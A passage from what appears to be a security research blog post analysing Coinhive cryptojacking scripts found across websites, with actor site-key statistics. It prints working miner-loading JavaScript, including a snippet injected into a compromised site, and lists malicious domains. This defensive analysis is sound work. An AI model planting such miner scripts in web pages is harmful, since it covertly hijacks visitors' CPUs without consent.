class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-t">var</span><span class="crayon-h"> </span><span class="crayon-v">miner</span><span class="crayon-o">=</span><span class="crayon-v">CoinHive</span><span class="crayon-sy">.</span><span class="crayon-e">Anonymous</span><span class="crayon-sy">(</span><span class="crayon-s">'T3z562MP2Zg1lIa7RUJy19d67woeZmJJ'</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-5f6928803d909686566629-8"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-v">miner</span><span class="crayon-sy">.</span><span class="crayon-e">start</span><span class="crayon-sy">(</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-5f6928803d909686566629-9"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">}</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-5f6928803d909686566629-10"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-v">document</span><span class="crayon-sy">.</span><span class="crayon-e">getElementsByTagName</span><span class="crayon-sy">(</span><span class="crayon-s">'body'</span><span class="crayon-sy">)</span><span class="crayon-sy">[</span><span class="crayon-cn">0</span><span class="crayon-sy">]</span><span class="crayon-sy">.</span><span class="crayon-e">appendChild</span><span class="crayon-sy">(</span><span class="crayon-v">mnr</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-5f6928803d909686566629-11"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-ta">&lt;/script&gt;</span></div><div class="crayon-line crayon-striped-line" id="crayon-5f6928803d909686566629-12"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-o">&lt;</span><span class="crayon-o">/</span><span class="crayon-v">body</span><span class="crayon-o">&gt;</span></div><div class="crayon-line" id="crayon-5f6928803d909686566629-13"><span class="crayon-o">&lt;</span><span class="crayon-o">/</span><span class="crayon-v">html</span><span class="crayon-o">&gt;</span></div></div></td>
					</tr>
				</table>
			</div>
		</div>
<!-- [Format Time: 0.0022 seconds] -->
<p>It is worth noting that such URLs are always belong to a jibberish[.]bid domain, with a long trailing set of parameters. Of the 35,119 URLs we collected, 33,188, or 94.5% are of this category. In addition, there are 612 URLs leading to the same set of .bid domains, but with much shorter URLs, like <span style="font-family: 'courier new', courier, monospace;">hxxp://www.pudptxanhspld[.]bid/static/robots.txt</span>, or even the domain itself: <span style="font-family: 'courier new', courier, monospace;">hxxp://www.pudptxanhspld[.]bid/.</span></p>
<p>The fact that robots.txt is hosting the exact same content as any other longer URLs with seemingly random parameters leads us to speculate that the domain will serve the same coin-mining content to all visitors, ignoring the request parameters or paths. It is interesting to speculate: why did our customer visit such weird, long, random URLs in the first place?</p>
<p>We give some of our speculations later in this blog.</p>
<p>After removing the .bid domains, we are left with 1,342 URLs, or 3.8% of the corpus. The remaining can be further categorized into the following three groups:</p>
<h2></h2>
<h2>Voluntary: Crypto-mining related sites</h2>
<p class="FirstParagraph">We found multiple URLs related to coin/crypto/mining keywords. Some of these are forums discussing crypto-mining, while others are introducing the concept. Regardless of the purpose of the websites, we did not find any evidence that such sites are asking user&#8217;s consent to mine XMRs.</p>
<h2></h2>
<h2>Voluntary: Monetization</h2>
<p class="FirstParagraph">This category includes sites that obviously want to include coin-mining scripts to monetize. Examples of these include video/porn sites such as</p>
<p class="SourceCode"><span class="VerbatimChar" style="font-family: 'courier new', courier, monospace;">xmoviesforyou[.]com</span><br />
<span class="VerbatimChar" style="font-family: 'courier new', courier, monospace;"> www.webze[.]tv</span></p>
<p class="FirstParagraph">While they do provide their normal service to the visitors, browsing these sites do not pop up any sort of warning of coin-mining behavior for the user. A script snippet embedded in such sites can be found here:</p>
<p></p><!-- Crayon Syntax Highlighter v_2.7.2_beta -->

		<div id="crayon-5f6928803d90c425142313" class="crayon-syntax crayon-theme-classic crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover" style=" margin-top: 12px; margin-bottom: 12px; font-size: 12px !important; line-height: 15px !important;">
		
			<div class="crayon-toolbar" data-settings=" mouseover overlay hide delay" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><span class="crayon-title"></span>
			<div class="crayon-tools" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><span class="crayon-mixed-highlight" title="Contains Mixed Languages"></span><div class="crayon-button crayon-nums-button" title="Toggle Line Numbers"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-plain-button" title="Toggle Plain Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-wrap-button" title="Toggle Line Wrap"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-expand-button" title="Expand Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-copy-button" title="Copy"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-popup-button" title="Open Code In New Window"><div class="crayon-button-icon"></div></div></div></div>
			<div class="crayon-info" style="min-height: 16.8px !important; line-height: 16.8px !important;"></div>
			<div class="crayon-plain-wrap"><textarea wrap="soft" class="crayon-plain print-no" data-settings="dblclick" readonly style="-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 12px !important; line-height: 15px !important;">
&lt;div style='padding-bottom:1px;'&gt;&lt;center&gt;&lt;iframe src="//ads.exoclick.com/iframe.php?idzone=1978420&amp;size=728x90" width="728" height="90" scrolling="no" marginwidth="0" marginheight="0" frameborder="0"&gt;&lt;/iframe&gt;&lt;/center&gt;&lt;/div&gt;&lt;link rel='stylesheet' id='yarppRelatedCss-group-css' href='http://www.xmoviesforyou.com/wp-content/plugins/bwp-minify/min/?f=wp-content/plugins/yet-another-related-posts-plugin/style/related.css' type='text/css' media='all' /&gt;
&lt;script type='text/javascript' src='http://www.xmoviesforyou.com/wp-content/plugins/bwp-minify/min/?f=wp-includes/js/wp-embed.min.js'&gt;&lt;/script&gt;
&lt;script type="text/javascript"&gt;
var __htapop = {};
var ue84gwapead = "\/\/cpaofferstat.com\/p?zoneId=2053591-2053649";
(function() {
    var s = document.createElement('script');
    var x = document.getElementsByTagName('script')[0];
    s.src   = ue84gwapead;
    s.type  = 'text/javascript';
    s.async = true;
    x.parentNode.insertBefore(s, x);
})();
&lt;/script&gt;
&lt;script src="https://coinhive.com/lib/coinhive.min.js"&gt;&lt;/script&gt;
&lt;script&gt;
        var miner = new CoinHive.Anonymous('Y6SEjQDJ0cLYs8qGClt74lChPIf5EGDt', {threads: 4, throttle: 0.8});
        miner.start(CoinHive.FORCE_EXCLUSIVE_TAB);
&lt;/script&gt;
&lt;/body&gt;
&lt;/html&gt;</textarea></div>
			<div class="crayon-main" style="">
				<table class="crayon-table">
					<tr class="crayon-row">
				<td class="crayon-nums " data-settings="show">
					<div class="crayon-nums-content" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-5f6928803d90c425142313-1">1</div><div class="crayon-num crayon-striped-num" data-line="crayon-5f6928803d90c425142313-2">2</div><div class="crayon-num" data-line="crayon-5f6928803d90c425142313-3">3</div><div class="crayon-num crayon-striped-num" data-line="crayon-5f6928803d90c425142313-4">4</div><div class="crayon-num" data-line="crayon-5f6928803d90c425142313-5">5</div><div class="crayon-num crayon-striped-num" data-line="crayon-5f6928803d90c425142313-6">6</div><div class="crayon-num" data-line="crayon-5f6928803d90c425142313-7">7</div><div class="crayon-num crayon-striped-num" data-line="crayon-5f6928803d90c425142313-8">8</div><div class="crayon-num" data-line="crayon-5f6928803d90c425142313-9">9</div><div class="crayon-num crayon-striped-num" data-line="crayon-5f6928803d90c425142313-10">10</div><div class="crayon-num" data-line="crayon-5f6928803d90c425142313-11">11</div><div class="crayon-num crayon-striped-num" data-line="crayon-5f6928803d90c425142313-12">12</div><div class="crayon-num" data-line="crayon-5f6928803d90c425142313-13">13</div><div class="crayon-num crayon-striped-num" data-line="crayon-5f6928803d90c425142313-14">14</div><div class="crayon-num" data-line="crayon-5f6928803d90c425142313-15">15</div><div class="crayon-num crayon-striped-num" data-line="crayon-5f6928803d90c425142313-16">16</div><div class="crayon-num" data-line="crayon-5f6928803d90c425142313-17">17</div><div class="crayon-num crayon-striped-num" data-line="crayon-5f6928803d90c425142313-18">18</div><div class="crayon-num" data-line="crayon-5f6928803d90c425142313-19">19</div><div class="crayon-num crayon-striped-num" data-line="crayon-5f6928803d90c425142313-20">20</div><div class="crayon-num" data-line="crayon-5f6928803d90c425142313-21">21</div></div>
				</td>
						<td class="crayon-code"><div class="crayon-pre" style="font-size: 12px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;"><div class="crayon-line" id="crayon-5f6928803d90c425142313-1"><span class="crayon-o">&lt;</span><span class="crayon-e">div </span><span class="crayon-v">style</span><span class="crayon-o">=</span><span class="crayon-s">'padding-bottom:1px;'</span><span class="crayon-o">&gt;</span><span class="crayon-o">&lt;</span><span class="crayon-v">center</span><span class="crayon-o">&gt;</span><span class="crayon-o">&lt;</span><span class="crayon-e">iframe </span><span class="crayon-v">src</span><span class="crayon-o">=</span><span class="crayon-s">"//ads.exoclick.com/iframe.php?idzone=1978420&amp;size=728x90"</span><span class="crayon-h"> </span><span class="crayon-v">width</span><span class="crayon-o">=</span><span class="crayon-s">"728"</span><span class="crayon-h"> </span><span class="crayon-v">height</span><span class="crayon-o">=</span><span class="crayon-s">"90"</span><span class="crayon-h"> </span><span class="crayon-v">scrolling</span><span class="crayon-o">=</span><span class="crayon-s">"no"</span><span class="crayon-h"> </span><span class="crayon-v">marginwidth</span><span class="crayon-o">=</span><span class="crayon-s">"0"</span><span class="crayon-h"> </span><span class="crayon-v">marginheight</span><span class="crayon-o">=</span><span class="crayon-s">"0"</span><span class="crayon-h"> </span><span class="crayon-v">frameborder</span><span class="crayon-o">=</span><span class="crayon-s">"0"</span><span class="crayon-o">&gt;</span><span class="crayon-o">&lt;</span><span class="crayon-o">/</span><span class="crayon-v">iframe</span><span class="crayon-o">&gt;</span><span class="crayon-o">&lt;</span><span class="crayon-o">/</span><span class="crayon-v">center</span><span class="crayon-o">&gt;</span><span class="crayon-o">&lt;</span><span class="crayon-o">/</span><span class="crayon-v">div</span><span class="crayon-o">&gt;</span><span class="crayon-o">&lt;</span><span class="crayon-e">link </span><span class="crayon-v">rel</span><span class="crayon-o">=</span><span class="crayon-s">'stylesheet'</span><span class="crayon-h"> </span><span class="crayon-v">id</span><span class="crayon-o">=</span><span class="crayon-s">'yarppRelatedCss-group-css'</span><span class="crayon-h"> </span><span class="crayon-v">href</span><span class="crayon-o">=</span><span class="crayon-s">'http://www.xmoviesforyou.com/wp-content/plugins/bwp-minify/min/?f=wp-content/plugins/yet-another-related-posts-plugin/style/related.css'</span><span class="crayon-h"> </span><span class="crayon-v">type</span><span class="crayon-o">=</span><span class="crayon-s">'text/css'</span><span class="crayon-h"> </span><span class="crayon-v">media</span><span class="crayon-o">=</span><span class="crayon-s">'all'</span><span class="crayon-h"> </span><span class="crayon-o">/</span><span class="crayon-o">&gt;</span></div><div class="crayon-line crayon-striped-line" id="crayon-5f6928803d90c425142313-2"><span class="crayon-ta">&lt;script </span><span class="crayon-e ">type</span><span class="crayon-o">=</span><span class="crayon-s">'text/javascript'</span><span class="crayon-h"> </span><span class="crayon-e ">src</span><span class="crayon-o">=</span><span class="crayon-s">'http://www.xmoviesforyou.com/wp-content/plugins/bwp-minify/min/?f=wp-includes/js/wp-embed.min.js'</span><span class="crayon-o">&gt;</span><span class="crayon-ta">&lt;/script&gt;</span></div><div class="crayon-line" id="crayon-5f6928803d90c425142313-3"><span class="crayon-ta">&lt;script </span><span class="crayon-e ">type</span><span class="crayon-o">=</span><span class="crayon-s">"text/javascript"</span><span class="crayon-o">&gt;</span></div><div class="crayon-line crayon-striped-line" id="crayon-5f6928803d90c425142313-4"><span class="crayon-t">var</span><span class="crayon-h"> </span><span class="crayon-v">__htapop</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-sy">{</span><span class="crayon-sy">}</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-5f6928803d90c425142313-5"><span class="crayon-t">var</span><span class="crayon-h"> </span><span class="crayon-e ">ue84gwapead</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-s">"\/\/cpaofferstat.com\/p?zoneId=2053591-2053649"</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-5f6928803d90c425142313-6"><span class="crayon-sy">(</span><span class="crayon-t">function</span><span class="crayon-sy">(</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-sy">{</span></div><div class="crayon-line" id="crayon-5f6928803d90c425142313-7"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-t">var</span><span class="crayon-h"> </span><span class="crayon-v">s</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-v">document</span><span class="crayon-sy">.</span><span class="crayon-e">createElement</span><span class="crayon-sy">(</span><span class="crayon-s">'script'</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-5f6928803d90c425142313-8"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-t">var</span><span class="crayon-h"> </span><span class="crayon-v">x</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-v">document</span><span class="crayon-sy">.</span><span class="crayon-e">getElementsByTagName</span><span class="crayon-sy">(</span><span class="crayon-s">'script'</span><span class="crayon-sy">)</span><span class="crayon-sy">[</span><span class="crayon-cn">0</span><span class="crayon-sy">]</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-5f6928803d90c425142313-9"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-v">s</span><span class="crayon-sy">.</span><span class="crayon-v">src</span><span class="crayon-h">&nbsp;&nbsp; </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-v">ue84gwapead</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-5f6928803d90c425142313-10"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-v">s</span><span class="crayon-sy">.</span><span class="crayon-e ">type</span><span class="crayon-h">&nbsp;&nbsp;</span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-s">'text/javascript'</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-5f6928803d90c425142313-11"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-v">s</span><span class="crayon-sy">.</span><span class="crayon-v">async</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-t">true</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-5f6928803d90c425142313-12"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-v">x</span><span class="crayon-sy">.</span><span class="crayon-v">parentNode</span><span class="crayon-sy">.</span><span class="crayon-e">insertBefore</span><span class="crayon-sy">(</span><span class="crayon-v">s</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-v">x</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-5f6928803d90c425142313-13"><span class="crayon-sy">}</span><span class="crayon-sy">)</span><span class="crayon-sy">(</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-5f6928803d90c425142313-14"><span class="crayon-ta">&lt;/script&gt;</span></div><div class="crayon-line" id="crayon-5f6928803d90c425142313-15"><span class="crayon-ta">&lt;script </span><span class="crayon-e ">src</span><span class="crayon-o">=</span><span class="crayon-s">"https://coinhive.com/lib/coinhive.min.js"</span><span class="crayon-o">&gt;</span><span class="crayon-ta">&lt;/script&gt;</span></div><div class="crayon-line crayon-striped-line" id="crayon-5f6928803d90c425142313-16"><span class="crayon-ta">&lt;script&gt;</span></div><div class="crayon-line" id="crayon-5f6928803d90c425142313-17"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-t">var</span><span class="crayon-h"> </span><span class="crayon-v">miner</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-r">new</span><span class="crayon-h"> </span><span class="crayon-v">CoinHive</span><span class="crayon-sy">.</span><span class="crayon-e">Anonymous</span><span class="crayon-sy">(</span><span class="crayon-s">'Y6SEjQDJ0cLYs8qGClt74lChPIf5EGDt'</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-sy">{</span><span class="crayon-v">threads</span><span class="crayon-o">:</span><span class="crayon-h"> </span><span class="crayon-cn">4</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-v">throttle</span><span class="crayon-o">:</span><span class="crayon-h"> </span><span class="crayon-cn">0.8</span><span class="crayon-sy">}</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-5f6928803d90c425142313-18"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-v">miner</span><span class="crayon-sy">.</span><span class="crayon-e">start</span><span class="crayon-sy">(</span><span class="crayon-v">CoinHive</span><span class="crayon-sy">.</span><span class="crayon-v">FORCE_EXCLUSIVE_TAB</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-5f6928803d90c425142313-19"><span class="crayon-ta">&lt;/script&gt;</span></div><div class="crayon-line crayon-striped-line" id="crayon-5f6928803d90c425142313-20"><span class="crayon-o">&lt;</span><span class="crayon-o">/</span><span class="crayon-v">body</span><span class="crayon-o">&gt;</span></div><div class="crayon-line" id="crayon-5f6928803d90c425142313-21"><span class="crayon-o">&lt;</span><span class="crayon-o">/</span><span class="crayon-v">html</span><span class="crayon-o">&gt;</span></div></div></td>
					</tr>
				</table>
			</div>
		</div>
<!-- [Format Time: 0.0032 seconds] -->
<p>What is more interesting is that by searching across the whole URL corpus for <span style="font-family: 'courier new', courier, monospace;">coinhive.min.js</span> downloads, we found URLs such as the below</p>
<p><span style="font-family: 'courier new', courier, monospace;">hxxp://avditmiohvtq[.]bid/y.htm%3fr=1507583452%26v=3%26jfbakqer=2246476%26ipgznbkx=%26bwxtoxtb=%26oghaenqv=%26hsvxkzhp=http://www.xmoviesforyou[.]com/2017/10/momsincontrol-rebecca-rhiannon-ryder-pussy-is-international.html%26s=1280%2c800%2c2%2c2560%2c1600</span></p>
<p>which includes <span style="font-family: 'courier new', courier, monospace;">xmoviesforyou[.]com</span> as part of the URL almost like a referrer parameter. We verified that the below is indeed a valid URL leading to a subpage in the porn site.</p>
<p><span style="font-family: 'courier new', courier, monospace;">hxxp://www.xmoviesforyou[.]com/2017/10/momsincontrol-rebecca-rhiannon-ryder-pussy-is-international.html</span></p>
<p>That site does include <span style="font-family: 'courier new', courier, monospace;">coinhive.min.js</span>, but at the time of our verification prior to publishing, the inclusion is directly from <span style="font-family: 'courier new', courier, monospace;">https://coinhive[.]com/lib/coinhive.min[.]js</span> and the whole page does not include any references to a suspicious .bid domain/URL. We speculate that the porn website URL may have included an iframe leading to the .bid domain, which then triggers the download of coinhive.min.js. However, this mechanism may have been later abandoned in favor of direct inclusion.</p>
<p>&nbsp;</p>
<h2>Compromised/Injected Integration</h2>
<p>Another group of sites seem to have fallen victims of malicious script injection into their vulnerable servers. We found that <span style="font-family: 'courier new', courier, monospace;">www.livetruemoney[.]com</span> uses up 100% of user&#8217;s CPU time. Upon closer investigation, we found that this site is hosting multiple copies of coinhive.min.js, toward the top and bottom of the page. A similar situation happens in <span style="font-family: 'courier new', courier, monospace;">www.comptesofficiels[.]com/</span>, where the snippet is injected outside of &lt;body&gt; tag (a common symptom for injected content), as follows:</p><!-- Crayon Syntax Highlighter v_2.7.2_beta -->

		<div id="crayon-5f6928803d90f365630168" class="crayon-syntax crayon-theme-classic crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover" style=" margin-top: 12px; margin-bottom: 12px; font-size: 12px !important; line-height: 15px !important;">
		
			<div class="crayon-toolbar" data-settings=" mouseover overlay hide delay" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><span class="crayon-title"></span>
			<div class="crayon-tools" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><span class="crayon-mixed-highlight" title="Contains Mixed Languages"></span><div class="crayon-button crayon-nums-button" title="Toggle Line Numbers"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-plain-button" title="Toggle Plain Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-wrap-button" title="Toggle Line Wrap"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-expand-button" title="Expand Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-copy-button" title="Copy"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-popup-button" title="Open Code In New Window"><div class="crayon-button-icon"></div></div></div></div>
			<div class="crayon-info" style="min-height: 16.8px !important; line-height: 16.8px !important;"></div>
			<div class="crayon-plain-wrap"><textarea wrap="soft" class="crayon-plain print-no" data-settings="dblclick" readonly style="-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 12px !important; line-height: 15px !important;">
&lt;script src="https://pingendo[.]com/assets/bootstrap/bootstrap-4.0.0-alpha.6.min.js"&gt;&lt;/script&gt;
&lt;/body&gt;
&lt;script&gt;
    var miner = new CoinHive.Anonymous('i9uQcOE9w92MvsV8JJjb7riFlJXg8Gwh', {throttle: 0.5});
    miner.start();
  &lt;/script&gt;
&lt;/html&gt;</textarea></div>
			<div class="crayon-main" style="">
				<table class="crayon-table">
					<tr class="crayon-row">
				<td class="crayon-nums " data-settings="show">
					<div class="crayon-nums-content" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-5f6928803d90f365630168-1">1</div><div class="crayon-num crayon-striped-num" data-line="crayon-5f6928803d90f365630168-2">2</div><div class="crayon-num" data-line="crayon-5f6928803d90f365630168-3">3</div><div class="crayon-num crayon-striped-num" data-line="crayon-5f6928803d90f365630168-4">4</div><div class="crayon-num" data-line="crayon-5f6928803d90f365630168-5">5</div><div class="crayon-num crayon-striped-num" data-line="crayon-5f6928803d90f365630168-6">6</div><div class="crayon-num" data-line="crayon-5f6928803d90f365630168-7">7</div></div>
				</td>
						<td class="crayon-code"><div class="crayon-pre" style="font-size: 12px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;"><div class="crayon-line" id="crayon-5f6928803d90f365630168-1"><span class="crayon-ta">&lt;script </span><span class="crayon-e ">src</span><span class="crayon-o">=</span><span class="crayon-s">"https://pingendo[.]com/assets/bootstrap/bootstrap-4.0.0-alpha.6.min.js"</span><span class="crayon-o">&gt;</span><span class="crayon-ta">&lt;/script&gt;</span></div><div class="crayon-line crayon-striped-line" id="crayon-5f6928803d90f365630168-2"><span class="crayon-o">&lt;</span><span class="crayon-o">/</span><span class="crayon-e">body</span><span class="crayon-o">&gt;</span></div><div class="crayon-line" id="crayon-5f6928803d90f365630168-3"><span class="crayon-ta">&lt;script&gt;</span></div><div class="crayon-line crayon-striped-line" id="crayon-5f6928803d90f365630168-4"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-t">var</span><span class="crayon-h"> </span><span class="crayon-v">miner</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-r">new</span><span class="crayon-h"> </span><span class="crayon-v">CoinHive</span><span class="crayon-sy">.</span><span class="crayon-e">Anonymous</span><span class="crayon-sy">(</span><span class="crayon-s">'i9uQcOE9w92MvsV8JJjb7riFlJXg8Gwh'</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-sy">{</span><span class="crayon-v">throttle</span><span class="crayon-o">:</span><span class="crayon-h"> </span><span class="crayon-cn">0.5</span><span class="crayon-sy">}</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-5f6928803d90f365630168-5"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-v">miner</span><span class="crayon-sy">.</span><span class="crayon-e">start</span><span class="crayon-sy">(</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-5f6928803d90f365630168-6"><span class="crayon-h">&nbsp;&nbsp;</span><span class="crayon-ta">&lt;/script&gt;</span></div><div class="crayon-line" id="crayon-5f6928803d90f365630168-7"><span class="crayon-o">&lt;</span><span class="crayon-o">/</span><span class="crayon-v">html</span><span class="crayon-o">&gt;</span></div></div></td>
					</tr>
				</table>
			</div>
		</div>
<!-- [Format Time: 0.0007 seconds] -->
<p>It is quite possible that crypto-mining has become a new injection attack in addition to traditional exploit kits redirections.</p>
<p>Finally, we have also seen some typo-squatting/phishing domains serving <span style="font-family: 'courier new', courier, monospace;">coinhive.min.js</span>. Examples include <span style="font-family: 'courier new', courier, monospace;">analytics-google[.]net/track.php, and www-bank[.]ru.</span></p>
<h2></h2>
<h2>Actor/Mining Configuration Analysis</h2>
<p class="FirstParagraph">According to our observation, coin mining integration scripts are rarely obfuscated, which means we can extract the anonymous &#8216;site key&#8217; and their configurations easily. Per Coinhive&#8217;s documentation, the &#8216;site key&#8217; is a unique identifier to indicate which beneficiary will be paid, therefore, the attacker has no incentive to garble this field. Here are some interesting stats about the actors and their configurations.</p>
<h6><strong>Actor distribution</strong></h6>
<p><img class="wp-image-46047 aligncenter" src="https://researchcenter.paloaltonetworks.com/wp-content/uploads/2017/10/CoinMining_1.png" alt="CoinMining_1" width="515" height="289" srcset="https://unit42.paloaltonetworks.com/wp-content/uploads/2017/10/CoinMining_1.png 875w, https://unit42.paloaltonetworks.com/wp-content/uploads/2017/10/CoinMining_1-300x168.png 300w, https://unit42.paloaltonetworks.com/wp-content/uploads/2017/10/CoinMining_1-768x431.png 768w, https://unit42.paloaltonetworks.com/wp-content/uploads/2017/10/CoinMining_1-370x208.png 370w" sizes="(max-width: 515px) 100vw, 515px" /></p>
<p>There is a clear winner at the top &#8211; ID <span style="font-family: 'courier new', courier, monospace;">t3z562mp2zg1lia7rujy19d67woezmjj</span> claiming 35,742 over 36,842 of all the IDs we were able to retrieve. Surprisingly, querying a website source code search engine like <a href="https://publicwww.com/websites/t3z562mp2zg1lia7rujy19d67woezmjj/">publicWWW</a> only returns 13 results (mostly .bid domains). The remote second and third sites scored 370 and 119 occurrences respectively, along with 8 other IDs topping 10 occurrences. A large number (146) of IDs only have 1 appearance in our dataset, and these are possibly category 2 or 3 in our integration scenarios described above – mining would benefit themselves rather than a campaign owner.</p>
<p>Unsurprisingly, site key owner <span style="font-family: 'courier new', courier, monospace;">t3z562mp2zg1lia7rujy19d67woezmjj</span> has all the <span style="font-family: 'courier new', courier, monospace;">.bid</span> URLs pointing to this payee. In addition, there are URLs such as</p>
<p><span style="font-family: 'courier new', courier, monospace;">http://216.21.13[.]11/s%3fcid=5100604%26iuid=1619927385%26ts=1507160862%26ps=3429657830%26pw=2413%26</span></p>
<p>also using the same site key. Passive DNS analysis reveals that this IP actually was mapped to serve.popads[.]net, so it is interesting that this particular advertising network may have led to crypto-mining behavior.</p>
<p>In this chart, a special case <span style="font-family: 'courier new', courier, monospace;">sitekey</span> stands out. There are 151 sites using it, and it is a predefined variable in previous scripts (as opposed to hardcoded string) so without dynamic analysis we are not able to retrieve its real content. We looked at a few samples and it seems that most sites using the sitekey variable are serving mining script to benefit themselves.</p>
<p>We found only six out of the entire URL population making more than one call to <span style="font-family: 'courier new', courier, monospace;">coinhive.Anonymous</span> function (which means they could possibly be compromised by two different adversaries/serving two different payees at the same time). Upon closer inspection, all the calls actually have the same site key, so in summary we did not find evidence of one site serving more than one beneficiary. We did, however, find out that one site, <span style="font-family: 'courier new', courier, monospace;">lottoipros[.]com</span>, is attempting to obfuscate its site key by using simple Unicode encoding:</p><!-- Crayon Syntax Highlighter v_2.7.2_beta -->

		<div id="crayon-5f6928803d912938043347" class="crayon-syntax crayon-theme-classic crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover" style=" margin-top: 12px; margin-bottom: 12px; font-size: 12px !important; line-height: 15px !important;">
		
			<div class="crayon-toolbar" data-settings=" mouseover overlay hide delay" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><span class="crayon-title"></span>
